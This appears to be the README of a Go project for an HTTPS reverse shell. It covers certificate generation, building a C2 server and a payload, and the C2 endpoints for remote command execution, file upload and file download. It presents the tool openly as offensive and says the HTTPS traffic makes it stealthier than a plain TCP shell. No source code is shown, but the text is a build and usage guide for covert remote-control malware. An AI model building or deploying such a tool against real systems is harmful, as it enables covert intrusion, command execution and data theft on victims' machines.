# https-reverse-shell-golang

A HTTPS reverse shell implemented in the Go programming language. 

## Prerequisites

* You need to have ```Golang``` installed on your system and have the variables ```$GOPATH``` and ```$GOBIN``` set.
* Install ```go-bindata``` via ```$ go get -u github.com/go-bindata/go-bindata/...``` 
(and install to bin via ```$ go install```)
* Install ```openssl``` in order to generate your cert/key pair.

## Build

In order to build, you need to create a server cert/key pair like this:

```
$ openssl genrsa -out server.key 2048
$ openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650
```


Put the ```server.cert``` and  ```server.key```  into the corresponding resource directories:

```
c2  
└─resources
│    server.crt
│    server.key
payload
└─resources
│    server.crt

```

Now you need to generate the resource file and build the binary:

```
$ cd c2 && go generate && go build
$ cd payload && go generate && go build
```

Eventually, you can run the binaries:

```
$ ./c2
[+] Server listening on (:4433)
```

```
$ ./payload
[+] Calling home to c2 to get cmd...
```

## Functionality

* Arbitrary command execute
* File upload
* File download

## Details

The payload calls home to the c2 server in an endless loop until it receives the "quit" command. The c2 requests a command from the user upon beacon from the payload. You can send any CLI arguments and upload/download arguments in the form of:

```CMD > upload <localFilePath>```

```CMD > download <remoteFilePath> <localFilePath>```

The c2 server implements the following endpoints:
* ```/getcmd``` - Asks the user for a command to send to the payload
* ```/cmdouput``` - Retrieves the output for the command executed on target machine through payload
* ```/upload``` - Handles upload requests
* ```/download``` - Handles download requests

The communication is encrypted via TLS. The general benefit of a HTTP/S reverse shell over a regular TCP reverse shell is that the traffic looks more legit and thus is stealthier.


